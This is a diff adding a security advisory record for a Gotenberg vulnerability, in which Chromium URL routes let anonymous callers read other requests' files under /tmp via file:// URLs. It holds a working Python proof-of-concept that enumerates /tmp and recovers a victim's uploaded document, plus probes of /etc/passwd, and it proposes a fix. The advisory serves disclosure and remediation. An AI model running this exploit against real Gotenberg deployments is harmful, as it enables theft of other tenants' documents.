@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-g924-cjx7-2rjw",
+  "modified": "2026-05-07T01:35:54.568670Z",
+  "published": "2026-05-07T01:15:47Z",
+  "aliases": [
+    "CVE-2026-42597"
+  ],
+  "summary": "Gotenberg allows Chromium URL conversion routes to read arbitrary files under /tmp via file:// scheme",
+  "details": "## Summary\n\nThe `/forms/chromium/convert/url` and `/forms/chromium/screenshot/url` routes accept `url=file:///tmp/...` from anonymous callers. The default Chromium deny-list intentionally exempts `file:///tmp/` so HTML/Markdown routes can load their own request-local assets, and those routes apply a per-request `AllowedFilePrefixes` guard to scope the read. The URL routes never set `AllowedFilePrefixes`, so the scope guard silently skips. Alice enumerates `/tmp/`, walks Gotenberg's per-request working directories, and reads the raw source files of other in-flight conversions as rendered PDF output.\n\n## Details\n\nThe default deny-list regex at `pkg/modules/chromium/chromium.go:449` uses a negative lookahead to exempt `/tmp/`:\n\n```go\nfs.StringSlice(\"chromium-deny-list\",\n    []string{`^file:(?!//\\/tmp/).*`},\n    \"Set the denied URLs for Chromium using regular expressions - supports multiple values\")\n```\n\n`pkg/gotenberg/outbound.go:185-187` short-circuits IP validation for non-HTTP schemes:\n\n```go\nif !httpLikeScheme(parsed.Scheme) {\n    return outboundDecision{}, nil\n}\n```\n\nSo any `file:///tmp/...` URL passes `FilterOutboundURL` cleanly.\n\nThe HTML route pairs the exemption with a per-request scope guard (`pkg/modules/chromium/routes.go:518`):\n\n```go\noptions.AllowedFilePrefixes = []string{ctx.DirPath()}\n```\n\nand the CDP `Fetch.requestPaused` handler enforces the scope (`pkg/modules/chromium/events.go:65-78`):\n\n```go\nif allow \u0026\u0026 strings.HasPrefix(e.Request.URL, \"file://\") \u0026\u0026 len(options.allowedFilePrefixes) \u003e 0 {\n    prefixMatch := false\n    for _, prefix := range options.allowedFilePrefixes {\n        if strings.HasPrefix(e.Request.URL, \"file://\"+prefix) {\n            prefixMatch = true\n            break\n        }\n    }\n    if !prefixMatch {\n        allow = false\n    }\n}\n```\n\nThe `len(options.allowedFilePrefixes) \u003e 0` condition skips the entire enforcement block when the slice is empty. The URL route handler at `pkg/modules/chromium/routes.go:406-448` (`convertUrlRoute`) never populates `AllowedFilePrefixes`. `MandatoryString(\"url\", \u0026url)` takes the form value without scheme validation and passes it to `convertUrl` → `chromium.Pdf` → Chromium navigation.\n\nGotenberg stores uploaded request assets at `/tmp/\u003cgotenberg-work-uuid\u003e/\u003crequest-uuid\u003e/\u003cfile-uuid\u003e.\u003cext\u003e` (`pkg/gotenberg/fs.go:64-65`). Chromium renders the targeted `file://` URL as a PDF and the response body returns to the caller.\n\n## Proof of Concept\n\nReproduction uses the stock Docker image with no auth:\n\n```bash\ndocker run -d --name gotenberg-poc -p 3000:3000 gotenberg/gotenberg:8\n```\n\nPython script. Alice attacks, Bob runs a slow legitimate conversion whose request directory stays alive long enough for Alice to locate it. `waitDelay=15s` stands in for any naturally slow convert (large DOCX, multi-page HTML with external fetches, LibreOffice rendering a complex spreadsheet):\n\n```python\nimport requests, threading, time, subprocess, re\nTARGET = \"http://localhost:3000\"\nSECRET = f\"BOB-CROSS-REQ-LEAK-{int(time.time())}\"\n\nbob_html = f\"\u003chtml\u003e\u003cbody\u003e\u003ch1\u003e{SECRET}\u003c/h1\u003e\u003c/body\u003e\u003c/html\u003e\".encode()\n\ndef bob_runs():\n    requests.post(\n        f\"{TARGET}/forms/chromium/convert/html\",\n        files={\"files\": (\"index.html\", bob_html, \"text/html\")},\n        data={\"waitDelay\": \"15s\"},\n        timeout=60,\n    )\n\ndef alice_reads(url):\n    r = requests.post(\n        f\"{TARGET}/forms/chromium/convert/url\",\n        files={\"url\": (None, url)}, timeout=30,\n    )\n    if r.status_code != 200: return None\n    open(\"/tmp/_alice.pdf\", \"wb\").write(r.content)\n    return subprocess.run(\n        [\"pdftotext\", \"/tmp/_alice.pdf\", \"-\"],\n        capture_output=True, text=True,\n    ).stdout\n\nthreading.Thread(target=bob_runs, daemon=True).start()\ntime.sleep(2)\n\n# Step 1: list /tmp/ to discover the gotenberg work UUID\ntmp = alice_reads(\"file:///tmp/\")\nwork = re.search(r\"([0-9a-f-]{36})\", tmp).group(1)\n\n# Step 2: walk into the work dir to find an in-flight request dir\nwd = alice_reads(f\"file:///tmp/{work}/\")\nfor req in re.findall(r\"([0-9a-f-]{36})\", wd):\n    if req == work: continue\n    rd = alice_reads(f\"file:///tmp/{work}/{req}/\")\n    if rd and (m := re.search(r\"([0-9a-f-]{36}\\.html)\", rd)):\n        # Step 3: read bob's uploaded HTML\n        txt = alice_reads(f\"file:///tmp/{work}/{req}/{m.group(1)}\")\n        print(\"SECRET recovered:\", SECRET in txt)\n        break\n\n# Sanity: /etc/passwd stays blocked (deny-list holds outside /tmp)\nr = requests.post(f\"{TARGET}/forms/chromium/convert/url\",\n    files={\"url\": (None, \"file:///etc/passwd\")}, timeout=30)\nprint(f\"/etc/passwd probe: HTTP {r.status_code}\")  # 403 Forbidden\n```\n\nOutput against gotenberg 8.31.0:\n\n```\nSECRET recovered: True\n/etc/passwd probe: HTTP 403\n```\n\n`file:///tmp/` directory enumeration works on every request, unconditionally. Cross-request content read depends on timing: Alice needs the victim's request dir alive when she walks to it. Long-running legitimate conversions (large inputs, external HTTP fetches, explicit `waitDelay`) widen the window from milliseconds to seconds.\n\n## Impact\n\nAn unauthenticated caller enumerates `/tmp/` on the Gotenberg host and reads the raw source files of other users' conversion requests while those requests are in flight. Content types include uploaded HTML, Markdown, Office documents awaiting LibreOffice conversion, and output PDFs staged for webhook delivery. The rendered file returns to the attacker as a PDF. In a multi-tenant deployment where multiple users submit documents to the same Gotenberg instance, cross-tenant document exfiltration is possible whenever the attacker wins the timing race against a victim's request lifecycle. Directory enumeration itself (the work-UUID and per-request-UUID structure) is available regardless of timing.\n\nThe deny-list regex holds for paths outside `/tmp/`. `file:///etc/passwd`, `file:///proc/self/environ`, and similar targets return HTTP 403. The primitive is scoped to `/tmp/`, not arbitrary filesystem read.\n\n## Recommended Fix\n\nRemove the `len(options.allowedFilePrefixes) \u003e 0` condition at `pkg/modules/chromium/events.go:65` so URL routes block every `file://` sub-resource by default:\n\n```go\nif allow \u0026\u0026 strings.HasPrefix(e.Request.URL, \"file://\") {\n    if len(options.allowedFilePrefixes) == 0 {\n        allow = false\n    } else {\n        prefixMatch := false\n        for _, prefix := range options.allowedFilePrefixes {\n            if strings.HasPrefix(e.Request.URL, \"file://\"+prefix) {\n                prefixMatch = true\n                break\n            }\n        }\n        if !prefixMatch {\n            allow = false\n        }\n    }\n}\n```\n\nEquivalent alternative: reject non-`http`/`https` schemes in the URL route handlers (`convertUrlRoute`, `screenshotUrlRoute`) before handing the URL to Chromium.\n\n---\n*Found by [aisafe.io](https://aisafe.io)*",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/gotenberg/gotenberg/v8",
+        "purl": "pkg:golang/github.com/gotenberg/gotenberg/v8"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "8.32.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 8.31.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-g924-cjx7-2rjw/GHSA-g924-cjx7-2rjw.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/gotenberg/gotenberg/security/advisories/GHSA-g924-cjx7-2rjw"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/gotenberg/gotenberg"
+    }
+  ]
+}
